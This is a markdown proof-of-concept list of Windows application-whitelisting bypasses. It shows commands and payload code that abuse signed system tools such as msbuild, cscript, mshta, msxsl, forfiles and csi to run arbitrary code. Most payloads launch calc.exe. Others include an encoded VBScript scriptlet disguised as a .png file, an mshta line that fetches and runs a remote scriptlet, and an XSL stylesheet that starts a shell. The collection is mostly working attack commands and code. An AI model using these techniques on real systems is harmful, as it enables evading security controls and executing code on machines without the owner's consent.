## POC



## 1.csc.exe
``` tex
c:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /out:Output\secist.exe Output\secist.cs &&  Output\secist.exe
```

### Code-secist.cs

``` 
using System;
namespace HelloWorld
{
    class Program
    {
        static void Main(string[] args)
        {
         System.Diagnostics.Process.Start("calc.exe");  
        }
    }
}
	
```


Links:
http://www.ggsec.cn/NET-CS-calc.html
https://web.archive.org/web/20161008143428/http://subt0x10.blogspot.com/2016/09/application-whitelisting-bypass-csiexe.html
https://github.com/milkdevil/UltimateAppLockerByPassList






## 2.cscript

``` code
cscript C:\Windows\System32\Printing_Admin_Scripts\zh-CN\pubprn.vbs localhost "script:"  绝对路径\demon.png
```

### code-demon.png

``` stylus
<scriptlet>
	<script language="VBScript.Encode">
			#@~^NAAAAA==O/O,',ZDlDnr(LnmD`E	UmDb2Yc?tssJ*R"EU`E^mV^Ra+r#ahEAAA==^#~@ 
	</script>
</scriptlet>
```

Links:
https://twitter.com/enigma0x3/status/923311244358094848
https://gist.githubusercontent.com/enigma0x3/2e4f571fe76715640d0f8126f321ba07/raw/73c962d65059a211b5d7ea212e9a1054d632622b/new.txt





## 3.msbuild.exe 

``` stylus
C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe  secist.csproj
```


### Code  secist.csproj
``` stylus
<Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
  <!-- This inline task executes c# code. -->
  <!-- C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe powaShell.csproj -->
  <Target Name="Hello">
   <ClassExample />
  </Target>
    <UsingTask
    TaskName="ClassExample"
    TaskFactory="CodeTaskFactory"
    AssemblyFile="C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Build.Tasks.v4.0.dll" >
    <Task>
     <Reference Include="C:\Windows\assembly\GAC_MSIL\System.Management.Automation\1.0.0.0__31bf3856ad364e35\System.Management.Automation.dll" />
     <!-- Your PowerShell Path May vary -->
      <Code Type="Class" Language="cs">
        <![CDATA[
            using System;
            using System.Reflection;
            using Microsoft.Build.Framework;
            using Microsoft.Build.Utilities;            
            using System.Collections.ObjectModel;
            using System.Management.Automation;
            using System.Management.Automation.Runspaces;
            using System.Text;                 
            public class ClassExample :  Task, ITask
            {
                public override bool Execute()
                {
                    System.Diagnostics.Process.Start("calc");
                    return true;
                }
            }
            public class powaShell
            {
                public static string RunPSCommand()
                {
                    InitialSessionState iss = InitialSessionState.CreateDefault();
                    iss.LanguageMode = PSLanguageMode.FullLanguage;
                    Runspace runspace = RunspaceFactory.CreateRunspace(iss);
                    runspace.Open();
                    RunspaceInvoke scriptInvoker = new RunspaceInvoke(runspace);
                    Pipeline pipeline = runspace.CreatePipeline();
 Console.WriteLine(System.Management.Automation.Security.SystemPolicy.GetSystemLockdownPolicy());                
                    pipeline.Commands.AddScript("[Math]::Sqrt(9)"); 
                    //Prep PS for string output and invoke
                    pipeline.Commands.Add("Out-String");
                    Collection<PSObject> results = pipeline.Invoke();
                    runspace.Close();
                    StringBuilder stringBuilder = new StringBuilder();
                    foreach (PSObject obj in results)
                    {
                        stringBuilder.Append(obj);
                    }
                    return stringBuilder.ToString().Trim();       
                }
            }
                            
        ]]>
      </Code>
    </Task>
  </UsingTask>
</Project>
```
link:
http://www.ggsec.cn/%E6%AF%8F%E6%97%A5%E5%AE%89%E5%85%A8%E5%B9%B2%E8%B4%A7%E5%8F%8A%E5%8A%A8%E6%80%81.html

https://github.com/re4lity/subTee-gits-backups




## 4.CL_Invocation.ps1
``` stylus
"powershell.exe Get-AuthenticodeSignature C:\\Windows\\diagnostics\\system\\AERO\\CL_Invocation.ps1;. C:\\Windows\\diagnostics\\system\\AERO\\CL_Invocation.ps1;SyncInvoke  calc.exe
```
Link: https://twitter.com/bohops/status/948061991012327424


## 5.forfiles

``` stylus
forfiles /p c:\\windows\\system32 /m notepad.exe /c calc.exe
```
Link：
https://twitter.com/Evi1cg/status/935027922397573120


## 6.mshta.exe

``` stylus
mshta.exe javascript:a=GetObject(\"script:https://raw.githubusercontent.com/redcanaryco/atomic-red-team/atomic-dev-cs/Windows/Payloads/mshta.sct\").Exec();close();"
```

Link: https://twitter.com/subTee/status/953990877264994304



## 7.pcalua.exe
``` stylus
c:\Windows\System32\pcalua.exe -a calc.exe
```
Link:  https://twitter.com/KyleHanslovan/status/912659279806640128




## 8.csi.exe

``` stylus
"C:\Program Files (x86)\MSBuild\14.0\Bin\csi.exe\"  secist.csx
```


## Code   secist.csx
``` stylus
using System;System.Diagnostics.Process.Start("calc.exe");
```

Link:  https://github.com/milkdevil/UltimateAppLockerByPassList



## msxsl

Code

``` stylus
msxsl.exe customers.xml script.xsl
```


customers.xml
``` stylus
<?xml version="1.0"?>
<?xml-stylesheet type="text/xsl" href="script.xsl" ?>
<customers>
<customer>
<name>Microsoft</name>
</customer>
</customers>
```


``` stylus
<?xml version='1.0'?>
<xsl:stylesheet version="1.0"
xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
xmlns:msxsl="urn:schemas-microsoft-com:xslt"
xmlns:user="http://mycompany.com/mynamespace">

<msxsl:script language="JScript" implements-prefix="user">
   function xml(nodelist) {
var r = new ActiveXObject("WScript.Shell").Run("cmd.exe /k C:\\PSShell.exe");
   return nodelist.nextNode().xml;
   }
</msxsl:script>
<xsl:template match="/">
   <xsl:value-of select="user:xml(.)"/>
</xsl:template>
</xsl:stylesheet>
```

Link:  https://pentestlab.blog/2017/07/06/applocker-bypass-msxsl/
https://evi1cg.me/archives/AppLocker_Bypass_MSXSL.html


## Tracker 

``` stylus
Tracker.exe /d runcalc.dll /c cmd
```

link https://twitter.com/Sudhanshu_C/status/943011972261412864
https://twitter.com/subTee/status/793151392185589760


